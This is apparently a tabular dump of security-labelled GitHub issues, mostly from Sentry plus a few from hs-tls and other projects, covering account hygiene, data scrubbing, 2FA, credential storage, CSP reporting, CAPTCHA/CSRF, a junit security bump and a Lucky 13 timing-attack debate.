Netflix does something similiar - they send out emails to customers who have stopped watching for more than a year asking to confirm if they want to keep the subscription. If no confirmation is received, they cancel the subscription and another year later they delete the account. Customer can ""recover"" their account anytime between when the email was sent and the actual deletion of the account 🚀 

This might seem like a thing not worth the effort, but I really think it would show that you care about your customers and their data and that you don't hold on to the data forever ❤️Hey @romantomjak, thanks for bringing this up and then following up on the issue here!

@leedongwei I think implementing something like this would be good for security too as stale accounts are more vulnerable and they may cause damage to both Sentry and the account owner. Pinging @getsentry/security for assesment here.Circling back from private Slack ... sounds like this is something we want to do, for security and other reasons. Thanks for the report, @romantomjak! :)",no,"Security,Status: Backlog,Team: Enterprise,"
getsentry/sentry,662688530,"Sanitation should happen before truncation","## Summary

Currently, sentry tries to strip sensitive data after the server has already truncated it, leaving some truncated sensitive data not stripped.

## Motivation

I rely a lot on server side filtering of sensitive data. However, there are times when sensitive data that are initially stripped are suddenly not stripped because the value became too large and some parts got truncated. The best example would be an RSA key in a dict in Python.

Say for example, I have this in a variable:
```
{
  ""data"": ""some_value"",
  ""private_key"": ""-----BEGIN PRIVATE KEY-----<The private key>-----END PRIVATE KEY-----""
}
```

Sentry is able to clean the `private_key`, resulting to:
```
{
  ""data"": ""some_value"",
  ""private_key"": ""-----BEGIN PRIVATE KEY-----[Filtered]-----END PRIVATE KEY-----""
}
```

However, if the dict gets big enough, like:
```
{
  ""data"": ""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."",
  ""private_key"": ""-----BEGIN PRIVATE KEY-----<The private key>-----END PRIVATE KEY-----""
}
```

When I send that to sentry, sentry stores this instead:
```
{
  ""data"": ""Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."",
  ""private_key"": ""-----BEGIN PRIVATE KEY-----<The private key>-----END PRIVATE...""
}
```

And so, the `private_key` is not stripped anymore, because the identifier `-----END PRIVATE KEY-----` has been truncated to `-----END PRIVATE...`
","We're aware of this problem. I don't think reordering the processing steps as you suggest will fix the problem as payload trimming can happen within the sdk or the application itself. The only way I see working is to adjust the regexes to work on partially trimmed data. That's tricky to do and not just one change.This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀",no,"Security,Status: Backlog,Team: Ingest,"
getsentry/sentry,668721754,"When 2fa is required you can't change your authenticator app without setting up something else first","## Summary

If your organization requires 2FA and you only have a single authenticator app configured, and you need to switch authenticator apps, you can't update the existing one to be the new one. Instead you have to add some other 2fa first, then delete the authenticator app, then add a new authenticator app, then delete the other 2fa you've configured (if you don't want it).

## Motivation

People who use google authenticator and switch to a new iphone have to reregister their authenticator apps with everything. This would make that easier.

","@wolfsage not sure what your proposal is, can you elaborate? From what I'm understanding, if 2FA is required, then at no point in time you should be able to login without 2FA. Which means you need to add a new app before removing the old one. Am I missing something?Let's imagine I'm using Sentry on an org that requires 2FA for all users.

I only use google authenticator app (TOTP).

I get a new phone, and therefor a new google authenticator app, and need to change my 2FA configured in sentry.

My steps right now are:
 * Add some secondary 2FA like mobile or U2F (which requires multiple steps, each)
 * Delete the totp 2FA
 * Add the new totp 2FA
 * Delete the mobile/U2F 2FA

That's a lot of steps.

I've used many other websites where I can just modify the TOTP to either generate a new secret or show me a QR code for the existing secret to migrate it to a new app. This is way more user friendly.@wolfsage ah, now I get it. Thanks for taking the time to walk me through. I'll share this with the rest of the team and see what we can do to improve this flow.This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀Bump, I guess? Unhelpful github-actions!I'm running into this exact issue right now. However, for some reason when trying to do the whole workaround (add sms 2FA, delete TOTP 2FA, add new TOTP 2FA, delete sms 2FA), I can even get through the first step, because i never receive the sms. I am entering my country's phone code extension (+xxx). So now I cant even port my TOTP to  new device",no,"Type: User Feedback,Component: Auth,Security,Status: Backlog,"
getsentry/sentry,526267087,"[JIRA] plugin store credentials in base64","When registering a JIRA instance in a project, the information and credentials are stored in plain base64 in the database, which mean that anybody able to connect to the database or read the dumps can log into the JIRA instance with the account of the linked user (which can be catastrophic depending the user's permissions).

I would suggest encoding these data in openssl aes256-cbc or any securized way to store sensitive data.","This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀@mbarbey sorry this got stale. I'm thinking about how to fix this but can't really find a good solution as even if we encrypt the credentials, we'd still need to make the key available to the app to decrypt on-demand which defeats the purpose.

Am I missing something here?@BYK I wasn't thinking about a sophisticated solution.
The issue here is about the fact that by simply having access to the database you can get the credentials of a Jira administrator. And we all know well how frequently databases tend to be dumped and published on the web due to security issues somewhere else on websites or servers. And having plain credentials of an administrator directly in the dumps clearly isn't an optimal situation.

I see 2 possible solutions, one very easy and one easy :

## 1. very easy
Simply generating a random key at the installation, storing it in a file somewhere in the project, and using this key to encrypt the credentials before storing it in the database.
This way, if someone want to get the Jira admin credentials, you need both access to the database and the host machine, which can be 2 differents systems.

## 2. easy
Same thing as the 1st option, but the file containing the encryption key is stored somewhere on the OS where the access is limited by users (like the .ssh directory on linux). It would probably be differents paths depending the OS so it might be a little more difficult than the 1st option, but not too much.
And with this option, if you want to find the credentials, you need both access to the database, the hosting machine and logging as the user Sentry is using.

And in both case, when migrating data to a new server, you will need to copy the security file to the new server or reconfigure the Jira plugin.

What do you think about it ?",no,"Security,Status: Backlog,Team: Ecosystem,"
getsentry/sentry,368751757,"Password set policy","<!--

Do you want to ask a question? Are you looking for support? The Sentry message
board is the best place for getting support: https://forum.sentry.io

Also note that the Sentry team has finite resources and priorities that are not
always visible on GitHub. If your issue doesn't align with our priorities it's
unlikely it will be worked on. If we're interested in a particular feature however,
we'll follow up and ask you to submit an RFC to talk about it in more detail.

-->

## Possibility to enable password set policy

Recently found that some team members use simple passwords like 123456. By far the only default restriction is 6 letter length. It'd be great if administrators can specify password requirements like (at least 1 uppercase letter, at least 1 digit)
","Closing this issue due to staleness. Feel free to comment here if you think we should still work on this.@BYK this is still use case for us.@Bessonov I understand. It is just very unlikely that this will be picked up by anyone soon or ever to be honest. Instead of having a system for password requirements configuration I think an easier thing to do would be adding a password-strength meter.It would be nice to have a configuration for password requirements, but a single boolean to activate strong passwords (topic to define) would be enough.

If you think of a password-strength meter, then I can imagine to have a static definition of ""weak"", ""good"" and ""strong"" password and let admin define which level is necessary with an select control. But I'm also fine if it's forced client side only.

The main problem why this is needed, it's because sentry must be public to get events from apps or websites. Is there any way to let event API public and hide developer/admin login?Any news about this issue ?I'll reopen as this might be something we'll look into. That said there are no solid plans or timeline yet.",no,"Type: User Feedback,Component: Auth,Security,Status: Backlog,"
getsentry/sentry,493724203,"Allow extra JSON fields for ingestion into security report API","<!--

Do you want to ask a question? Are you looking for support? The Sentry message
board is the best place for getting support: https://forum.sentry.io

Also note that the Sentry team has finite resources and priorities that are not
always visible on GitHub. If your issue doesn't align with our priorities it's
unlikely it will be worked on. If we're interested in a particular feature however,
we'll follow up and ask you to submit an RFC to talk about it in more detail.

-->

## Summary

Extra fields in security reports are rejected by Sentry. This breaks compatibility with some libraries which are otherwise compatible with the security header API. There are workarounds but it would be nice for Sentry to accept extra data into the event. Also, please keep HPKP report support--it is useful for non-browser apps.

## Motivation

While HPKP is being deprecated in browsers, best practice for mobile and desktop apps remains pinning TLS keys (as the code distribution model is not the web so isn't absurdly dangerous). One of the nicest libraries for doing this on Android and iOS is called TrustKit. It uses the HPKP report format and is compatible with Sentry security reports as long as we remove some extra fields TrustKit adds (we keep the information around by making them fake HTTP headers), because Sentry does not allow any fields it doesn't recognize in security reports. Is this restriction necessary? It seems overly draconian and that unrecognized fields could be allowed and become part of the event as unstructured data.

## Additional Context

The extra TrustKit fields are:
-  app-bundle-id
-  app-version
-  app-vendor-id
-  app-platform
-  trustkit-version
-  enforce-pinning
-  validation-result
","This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀""Comment"" to keep issue open :)Routing to @getsentry/owners-ingest for [triage](https://develop.sentry.dev/processing-tickets/#3-triage). ⏲️
@bartbutler what do you see in sentry that makes it appear rejected?The ingestion fails with a non-200 response code, because the security report API does not allow any extra fields besides those it whitelists.I see, this is definetly not intended. Accepting as bug.Thank you!",no,"Type: Bug,Security,Status: Backlog,Team: Ingest,"
getsentry/sentry,595772075,"Bug reporting dialog requires ""unsafe-inline"" for ""style-src-elem"" CSP","## Summary

Since there are many browser extensions (and also some ISPs) which inject scripts and styles into my web application, which results into errors, I use a restrictive CSP setup, which bans inline code, evals, etc.

Unfortunately, to be able to use the Sentry dialog for bug reporting, I need to set ""unsafe-inline"" for ""style-src-elem"", because it uses inline styles, which openes a door for errors.

## Motivation

My motivation is, to prevent injected code into my webapp as much as possible. To prevent errors, which are triggered by browser extensions and ISPs.

## Additional Context

I'm using JavaScript and the following call, to open the report dialog:
```js
Sentry.showReportDialog({ eventId: event.event_id });
```","This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀Are there any news regarding this issue?FYI I created a related issue #34415",no,"Component: Feedback,Security,Status: Backlog,"
getsentry/sentry,892041773,"Support reCAPTCHA on critical anonymous views","To prevent bots from abusing certain endpoints (specifically things like registration) we want to enable reCAPTCHA on various endpoints.

At minimum this will be the signup endpoint, but there is value in ensuring this can be used now or in the future for several other endpoints, including login and password recovery.

Implementation likely includes:

- a feature flag for the action to determine if the request should be captcha bound
- API [verifies reCAPTCHA](https://developers.google.com/recaptcha/docs/verify) payload when flag is present 
- UI implements [invisible reCAPTCHA](https://developers.google.com/recaptcha/docs/invisible) possibly using something like [react-recaptcha](https://github.com/appleboy/react-recaptcha)
- TBD: getting configuration into the signup endpoints so they understnad if they do or do not need to require captcha. this also needs some carry over into getsentry's custom signup entrypoint.","@dcramer which team is owning this initiative?@BYK right now I amI spent some time on this today and itll be more tricky than I hoped given the changes that have occurred in the cloud service codebase.

New plan:

- Pull getsentry's signup code (API based) into sentry core. Basically expose a /auth/register/ endpoint which eventually getsentry can inherit/overload (assuming it still needs to)
- Move /auth/login/'s register code to use the API client (or another abstraction) so they can share the same validation code.
- Push the recaptcha validation logic into the API endpoint. This basically makes it only serviceable to getsentry, or via a getsentry embedded iframe, but that should be ok.
- TBD: Update the legacy UI code (which is HTML generated) to somehow embed recaptcha

Once the above is done, it can be merged/released. Then changes can be staged in getsentry:

- Update the signup endpoints to use the new sentry API(s)
- Update the signup frontend code to use react-recaptcha or whatever abstraction exists

It's possible it might be simpler to pull in Google's core recaptcha support so we have one library that is shared between react and non-react pages, and just implement a tiny layer for the react page. I dont think it needs to do much (hook a submit event, bind some data), so it's likely not much code.
After a good nights rest I've had the realization that our bot issue is likely due to the fact that CSRF protections were removed from the signup endpoint. Will be exploring how to get that resolved as a first step pre-captcha. The new session auth _will_ enforce it, but that means the page needs to ensure a CSRF cookie is present first.Had to revert the CSRF change as the upstream signup page is not clearing auth classes (wrong code comment) and the signup page def breaks due to CSRFAnother item identified is we should probably require CORS (e.g. `SENTRY_ALLOWED_DOMAINS`) on session-based API views. That's a little tricky of a change today (likely) as it requires passing an object to `request.auth`, which in many scenarios we assume the lack of object = session auth. Also might mean we could just hijack it and enforce that meaning in the core endpoint class.",no,"Status: In Progress,Component: Auth,Security,Team: Revenue,"
getsentry/sentry,356773048,"Add comment/name to Auth Tokens","With many Auth Tokens it's quite easy to loose track of them. Having comment or name field for each Auth Token it would be easier to found the ones which are no longer used and can be safely removed.

I'm currently using sentry.io service if that matters.","GitLab tokens have names. GitHub tokens have names. DataDog tokens have names. The list never ends. Please let us define a name for Sentry tokens too.This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Accepted`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀Bad botRouting to @getsentry/ecosystem for [triage](https://develop.sentry.dev/processing-tickets/#3-triage). ⏲️
This issue has gone three weeks without activity. In another week, I will close it.

But! If you comment or otherwise update it, I will reset the clock, and if you label it `Status: Backlog` or `Status: In Progress`, I will leave it alone ... forever!

----

""A weed is but an unloved flower."" ― _Ella Wheeler Wilcox_ 🥀Closing feature requests ain't good. ",no,"Component: Auth,Security,Status: Backlog,Team: Ecosystem,"
getsentry/sentry,372065796,"'Unknown Content-type' when logging CSP violations in Firefox 62","## Important Details

How are you running Sentry?

* [ ] On-Premise docker [Version xyz]
* [x] Saas (sentry.io)
* [ ] Other [briefly describe your environment]

## Description

I am setting up a CSP for my site and attempting to log violations to Sentry, but I have noticed that requests from my browser (Firefox) are returning status 400 and are not being logged to Sentry.

My CSP header looks like the following:
```
default-src 'self';
base-uri 'none';
form-action 'none';
frame-ancestors 'none';
report-uri https://sentry.io/api/{ID}/security/?sentry_key={KEY};
```
Firefox is trying to log violations by using 'fetch' to post JSON to the endpoint, but is receiving the following response:

```json
{
    ""error"": ""Invalid Content-Type""
}
```
It looks as if Firefox is not specifying the `Content-Type` header for the request, but is sending valid JSON.

### Possible Solution

Perhaps Sentry could make a reasonable guess as to the request's content type if the `Content-Type` header is not speficied?","I wouldn't be surprised if this is due to the lack of `effective-directive`, which leads to Sentry just dropping all CSP reports from Firefox.

See also https://bugzilla.mozilla.org/show_bug.cgi?id=1192684.I guess this is here to stay based on that bugzilla ticket.@dcramer @mitsuhiko do we want to invest into this?",no,"Component: Issues,Security,Status: Backlog,"
getsentry/sentry,232365120,"Support browser reports submitted via Reporting API","Instead of supporting a different reporting method for every different browser feature (CSP, HPKP, Expect-CT, etc.), a [Reporting API](https://wicg.github.io/reporting/) is being developed to allow batching all these reports together and submitting to an endpoint.

Chrome [just announced](https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/Xro1jnasnY0/rUbiEtbDBQAJ) that they are implementing this.

From my understanding, CSP (and other reports) will be deprecating their old reporting method and swapping to this new reporting method. As normal CSP reports are already supported by Sentry, just need to add support for this new API to keep up once Chrome and other browsers start supporting (and sending) them.

cc @ScottHelme","> CSP's existing `report-uri` mechanism is fairly naive with regard to it's behavior on the network. We send one POST per violation, which means that we're sending a _lot_ of requests in aggregate. `report-to` uses the Reporting API to batch up violation reports, and send them out of band, whenever the device is happiest sending reports.

Yessss. I'll keep an eye on this for now.This is now implemented in Chrome (behind a flag): https://developers.google.com/web/updates/2018/09/reportingapi

For `ReportingObserver` (part of the Reporting W3C spec), I opened a ticket with RavenJS: https://github.com/getsentry/sentry-javascript/issues/1450Hi! Is this feature something you are working on implementing?@kaplun There is a pull request open to support the `Report-To` header but the reporting API doesn't have any complete implementations yet.You mean the Sentry's PR is not having a complete implementation or browsers do not have yet a complete implementation? Because it looks like they do have it: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to#Browser_compatibility (edit: corrected URL)My mistake, I was conflating the feature-policy reports with the `Report-To` header. Feature policy violation reporting is what we have an open pull request for #8921.

To my knowledge there aren't any open pull requests to add support for `Report-To` and no work planned for the next few months.Related: https://github.com/getsentry/sentry/issues/10202I can't figure out how to make CSP reporting work with `Report-To` header. Our service provides Report-To header pointing to sentry and our `Content-Security-Policy-Report-Only` report-to directive points to the group described in `Report-To`. But chrome is unable to send a report in this case. All the attempts 3(3) are failed according to chrome://net-export/.
Does sentry support `Report-To` with CSP?@dzagorovsky don't think we support this yet but keeping the issue open as a feature request.Please support this. `report-uri` is officially deprecated.Any updates on this yet? Browsers are now soon moving to 'reporting-endpoints' too. No updates. There aren't any current plans to add support for reporting endpoints._We thought that CSP reporting is supported._
_please update / remove CSP instructions as it seems not working as it is now._
_We configured report-uri and nothing happens with modern browsers._
_we tried to configure Report-url however as it is not supported again nothing happened in sentry._
_Eventually we find the open issue confirming that CSP reporting is not supported ..._

**I am sincerely sorry** . It seems issue is caused by not fully undersanding how HTTP header and meta tag CSP policy compliment each other.
We had meta tag + header for report-uri and it did not work. however as soon as we added full policy into header it worked.
Not sure if headereis ignored because no useful policy is there OR report-uri is used only for values specified in header.
@drekinov CSP reporting _is_ supported (I'm successfully using it for instance). This issue is about supporting the new reporting format, defined via the `report-to` directive. If you use the good old `report-uri` it works. It needs to look something like this:
```
report-uri https://sentry.io/api/xxxx/security/?sentry_key=xxxxxx&sentry_environment=beta&sentry_release=xxxxxx
```Any news or updates on this?",no,"Type: User Feedback,Security,Status: Backlog,"
tpryan/CFConsole,296486,"Auth allows all","Change the authentication to allow for cfadmin usernames and passwords
",,no,"Security,Features,"
klauern/sshtoys,719293566,"[Security] Bump junit from 4.4 to 4.13.1","Bumps [junit](https://github.com/junit-team/junit4) from 4.4 to 4.13.1.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/releases"">junit's releases</a>.</em></p>
<blockquote>
<h2>JUnit 4.13.1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.1.md"">release notes</a> for details.</p>
<h2>JUnit 4.13</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.13.md"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 RC 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 2</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.13 Beta 1</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit4/wiki/4.13-Release-Notes"">release notes</a> for details.</p>
<h2>JUnit 4.12</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 3</h2>
<p>Please refer to the <a href=""https://github.com/junit-team/junit/blob/HEAD/doc/ReleaseNotes4.12.md"">release notes</a> for details.</p>
<h2>JUnit 4.12 Beta 2</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.12 Beta 1</h2>
<p>No release notes provided.</p>
<h2>JUnit 4.11</h2>
<p>No release notes provided.</p>
</blockquote>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href=""https://github.com/junit-team/junit4/blob/main/doc/ReleaseNotes4.13.1.md"">junit's changelog</a>.</em></p>
<blockquote>
<h2>Summary of changes in version 4.13.1</h2>
<h1>Rules</h1>
<h3>Security fix: <code>TemporaryFolder</code> now limits access to temporary folders on Java 1.7 or later</h3>
<p>A local information disclosure vulnerability in <code>TemporaryFolder</code> has been fixed. See the published <a href=""https://github.com/junit-team/junit4/security/advisories/GHSA-269g-pwp5-87pp"">security advisory</a> for details.</p>
<h1>Test Runners</h1>
<h3>[Pull request <a href=""https://github-redirect.dependabot.com/junit-team/junit4/issues/1669"">#1669</a>:](<a href=""https://github-redirect.dependabot.com/junit-team/junit/pull/1669"">junit-team/junit#1669</a>) Make <code>FrameworkField</code> constructor public</h3>
<p>Prior to this change, custom runners could make <code>FrameworkMethod</code> instances, but not <code>FrameworkField</code> instances. This small change allows for both now, because <code>FrameworkField</code>'s constructor has been promoted from package-private to public.</p>
</blockquote>
</details>
<details>
<summary>Commits</summary>
<ul>
<li>See full diff in <a href=""https://github.com/junit-team/junit4/commits/r4.13.1"">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=junit:junit&package-manager=maven&previous-version=4.4&new-version=4.13.1)](https://dependabot.com/compatibility-score/?dependency-name=junit:junit&package-manager=maven&previous-version=4.4&new-version=4.13.1)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language
- `@dependabot badge me` will comment on this PR with code to add a ""Dependabot enabled"" badge to your readme

Additionally, you can set the following in your Dependabot [dashboard](https://app.dependabot.com):
- Update frequency (including time of day and day of week)
- Pull request limits (per update run and/or open at any time)
- Out-of-range updates (receive only lockfile updates, if desired)
- Security updates (receive only security updates, if desired)



</details>","We've just been alerted that this update fixes a security vulnerability:

*Sourced from [The GitHub Security Advisory Database](https://github.com/advisories/GHSA-269g-pwp5-87pp).*

> **TemporaryFolder on unix-like systems does not limit access to created files**
> ### Vulnerability
> 
> The JUnit4 test rule [TemporaryFolder](https://junit.org/junit4/javadoc/4.13/org/junit/rules/TemporaryFolder.html) contains a local information disclosure vulnerability.
> 
> Example of vulnerable code:
> ```java
> public static class HasTempFolder {
>     @Rule
>     public TemporaryFolder folder = new TemporaryFolder();
> 
> ... (truncated)

> 
> Affected versions: [""< 4.13.1""]

",yes,"dependencies,security,"
haskell-tls/hs-tls,48213293,"Security assessment in docs?","I was looking for a secure SSL implementation for Haskell (while investigating the best fix for ndmitchell/hoogle#92), and this looks like a good candidate.

However, I don't find sufficient documentation on the security of this library. I don't want to attack you, I appreciate the work, but the README does not explicitly discuss the security of the library, so I thought I'd ask. Moreover, while without docs I'd assume the library is insecure, less security-conscious user might assume it's secure if there's no warning against that, so it would be nice if you were explicit about it.

I've skimmed the README on Github, the [main hackage page](http://hackage.haskell.org/package/tls-1.2.13) and [the docs of the main module](http://hackage.haskell.org/package/tls-1.2.13/docs/Network-TLS.html), and came back empty.

[Some commenters](https://news.ycombinator.com/item?id=7557089) ask whether such an implementation is safe against timing attacks. [I found your answer](https://news.ycombinator.com/item?id=7559981), but:
- some people ask how do you prevent GHC from introducing timing vulnerabilities, and I see no answer. Which makes sense, because a suitable auditing is IMHO a research problem.
- that answer is not linked from the README. I think the docs should contain such a discussion.

The only other example of such an effort I've found is [one in Ocaml](http://openmirage.org/blog/ocaml-tls-api-internals-attacks-mitigation). I've skimmed the page, and they seem to document explicitly what has been audited, which attacks have been mitigated and what hasn't — for instance, they write ""for the time being we suggest to not use the stack on a multi-tenant shared host or on a shared host which malicious users might have access to.""
","yes, the security documentation is not as much written as I would want. You're more than welcome to start such a document listing potential problems (generic tls one or more specific one), that would help me getting this documentation started
Thanks for the positive reply. And sorry I won't start this document myself: I prefer somebody with more of a clue doing that.

I'd add a statement to the README pointing ""this has not been subject to a full security auditing"" or some such disclaimer, but I'm not sure I should propose a phrasing.

From the other comment:

> The fact that you (and @abacabadabacaba ) are focusing on timing attacks [1] whereas they are so many things that can go fundamentally wrong (think Heartbleed, think apple crypto, basic logic errors, Denial of service, etc) tells me that you're not having an honest thinking about this. I'm all for skepticism in the face of cryptography and security, and anyone should doubt security stuff (that include openssl, which seems as usual to get a free pass here), but there's no point repeating common ""knowledge"" out of the internet about cryptography and trying to pass it as an educated thought.

Sorry about any of that, and I'm sorry it's not very constructive, FUD and so on. I'm not advocating for openssl: I'm at most a user of cryptography, so I can at most evaluate discussions of existing libraries. And the result here is ""I can't use this library currently without analyzing the threat model myself - do I care about timing attacks, X, Y and Z?"".

However, I mostly liked the code I've seen, FWIW; my sincere impression is that you are competent enough. After learning about timing attacks against memcmp, I've examined it. I've seen your constant-time comparison function, and I've seen the many instances of `deriving Eq` (which risks being non-constant-time), which however seemed fine (especially because you often use SecureMem, which is a great primitive!) because they are just on protocol IDs (and I'm guessing that's fine, though what do I know?). But I need to _guess_ that you've put thought into this.

The only _suspicious_ `Eq` instance I found was one on AESIV: this is probably safe, but if so for much trickier reasons. [Quoting](http://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Initialization_vector_.28IV.29):

>  If an attacker knows the IV (or the previous block of ciphertext) before he specifies the next plaintext, he can check his guess about plaintext of some block that was encrypted with the same key before (this is known as the TLS CBC IV attack).[9][http://www.openssl.org/~bodo/tls-cbc.txt]

Is there a comparison which leaks IV before it is used so that an attacker can do such an attack? It sounds extremely unlikely, but I'm not sure. It certainly deserves a comment.
the IV is never a secret value (so leaking something public through side channel is not a problem), however most of the time (including in the case you're talking about), the attacker shouldn't be able to guess the IV we're going to use. Otherwise he can try to tweak its input to be able to ""counter"" the future IV for example.
Thanks for the answer. There would only be a problem if the code uses the AESIV ""too early"" enabling the attacker to guess (which sounds unlikely, but what do I know?). Either one uses SecureMem ""just so"" to be safer, or checks against this attack, or drops the Eq instance if possible.
(Can't help more for now, sorry about that).
I'm interested as well. But regarding timing attacks, wouldn't it be easier and safer if we wrapped computations in (tweakable) timeouts for now? It won't thwart side-channel attacks on the same machine, but it looks like a very straightforward, blanket fix.
",no,"security,doc,"
haskell-tls/hs-tls,102389175,"Is hs-tls affected by CVE-2013-0169","Hi Vincent,

we (the Debian Haskell package maintainers) have [been approached](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=796342) by the security team to find out whether haskell-tls is affected by [CVE-2013-0169](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0169), and if so, what versions. Unfortunately, I don’t find any reference to this in the git commit log or elsewhere, so I have to ask you for this information.

Thanks,
Joachim 
","While I don't want to ignore this, I'm having trouble to give any authoritative answer about this. It's very likely timing sensitive in `tls`, but whether that gives any useful information considering the extreme noise, remain to be studied.
given the complexity of [necessary fix](https://www.imperialviolet.org/2013/02/04/luckythirteen.html), it's basically impossible for a straight-forward implementation to _not_ be vulnerableJust stop using CBC.
We should eventually remove all CBC stuff from `ciphersuite_strong`.@tomato42 it would be a mistake to apply C's model to Haskell and consider this a straight forward implementation. we're pretty much in uncharted territory considering this kind of timing.

I'll be happy when CBC disappear from living memory, but we are clearly many years (decade ?) away from that.@vincenthz the problem is not C memory or execution model, the problem is how hash functions work, their *definition*. So unless the implementation of hashes takes the same amount of time to execute irrespective of size of input (be it 1 byte or 4GiB), or there are workarounds on the TLS record layer level, the implementation is vulnerable to Lucky 13.

So given that the first is basically impossible (not without making the implementation useless), the latter is something you can't do inadvertently, and you don't claim that there are any workarounds for that, the conclusion is simple - hs-tls is vulnerable to CVE-2013-0169. 

@kazu-yamamoto GnuTLS and OpenSSL (1.1.0) support Encrypt-then-MAC which is not vulnerable to Lucky 13. (While CBC is not perfect, it's not the cause of the vulnerability)@tomato42 maybe, but you still have no proofs whatsoever that any of this issue apply (completely, partially or at all) to the haskell ""environment"". some timing issues are the direct results of the much simpler model (in predictability) that the C environment gives you.

Related to CBC, what @kazu-yamamoto was implying is that clearly the TLS CBC family of cipher is not a great spec (crypto weak, too fiddly) and that moving away from it (even after a lucky13 fix) would be the best outcome for many reason. It's removed from tls1.3 for those reasons and we also have much better cryptographic construction (AEAD) that are much less fiddly to implement now (e.g. chachapoly1305 comes to mind)@tomato42 IETF guys are getting to forget Encrypt-then-MAC. The current hope is AEAD required by HTTP/2 and TLS 1.3.  hs-tls already supports AES-GCM which is one implementation of AEAD.> @tomato42 maybe, but you still have no proofs whatsoever that any of this issue apply (completely, partially or at all) to the haskell ""environment"".

you're really asking me to *prove* that using haskell to calculate hash of 100 bytes and 300 bytes using SHA-1 will take different amounts of time?

Even if there is more noise in the signal provided by Haskell than it is in C, it doesn't make the attack impossible, only a bit harder: https://eprint.iacr.org/2015/1129.pdf  You **need** constant time implementation and it's not something you get by mistake, just like you won't get a working pocket clock by mistake when you wanted to make a round paperweight.

----

